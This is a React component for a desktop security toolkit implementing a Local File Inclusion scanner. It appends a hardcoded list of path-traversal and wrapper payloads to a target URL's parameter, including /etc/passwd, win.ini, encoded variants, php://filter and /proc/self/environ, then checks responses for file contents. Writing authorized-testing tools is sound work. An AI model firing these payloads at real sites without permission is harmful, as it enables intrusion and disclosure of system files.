import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { FileIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

export default function LFIScanner() {
  const [url, setUrl] = useState('');
  const [parameter, setParameter] = useState('file');
  const [results, setResults] = useState<{ payload: string; status: string }[]>([]);
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState('');

  const payloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '../../../etc/passwd%00',
    'php://filter/convert.base64-encode/resource=index.php',
    'file:///etc/passwd',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
  ];

  const scan = async () => {
    if (!url.trim() || !parameter.trim()) {
      setError('Please enter URL and parameter name');
      return;
    }

    setLoading(true);
    setError('');
    setResults([]);
    setProgress(0);

    const testResults: { payload: string; status: string }[] = [];

    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      const separator = url.includes('?') ? '&' : '?';
      const testUrl = `${url}${separator}${parameter}=${encodeURIComponent(payload)}`;
      setProgress(Math.round(((i + 1) / payloads.length) * 100));

      try {
        const response = await window.electronAPI.net.httpFetch(testUrl, { method: 'GET' });
        if (response.success && response.data) {
          const indicators = ['root:x:0:0', '[extensions]', '<?php', '/bin/bash', 'proc/self'];
          const found = indicators.find((ind) => response.data?.toLowerCase().includes(ind));

          if (found) {
            testResults.push({ payload, status: `VULNERABLE - Found: "${found}"` });
          } else {
            testResults.push({ payload, status: 'No indication' });
          }
        } else {
          testResults.push({ payload, status: `Error: ${response.error || 'Request failed'}` });
        }
      } catch {
        testResults.push({ payload, status: 'Error' });
      }

      setResults([...testResults]);
      await new Promise((r) => setTimeout(r, 100));
    }

    setLoading(false);
  };

  return (
    <ToolWrapper
      title="LFI Scanner"
      icon={<FileIcon />}
      description="Detect Local File Inclusion vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com/page.php"
          />
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Parameter Name</label>
          <input
            type="text"
            className={styles.input}
            value={parameter}
            onChange={(e) => setParameter(e.target.value)}
            placeholder="file"
          />
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={scan} disabled={loading}>
            {loading ? `Scanning... ${progress}%` : 'Start Scan'}
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setUrl('');
              setParameter('');
              setResults([]);
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {loading && (
        <div className={styles.resultBox}>
          <div className={styles.progressBar}>
            <div className={styles.progressFill} style={{ width: `${progress}%` }} />
          </div>
        </div>
      )}

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Results</span>
          </div>
          {results.map((r, i) => (
            <div key={i} className={styles.resultItem}>
              <span
                className={
                  r.status.includes('VULNERABLE') ? styles.badgeError : styles.badgeSuccess
                }
                style={{ marginRight: '8px' }}
              >
                {r.status.includes('VULNERABLE') ? 'VULN' : 'OK'}
              </span>
              <span className={styles.code}>{r.payload}</span>
              <span style={{ marginLeft: '8px', color: 'var(--color-text-tertiary)' }}>
                {r.status}
              </span>
            </div>
          ))}
        </div>
      )}

      <div className={styles.warningBox}>
        Only test on systems you own or have permission to test.
      </div>
    </ToolWrapper>
  );
}
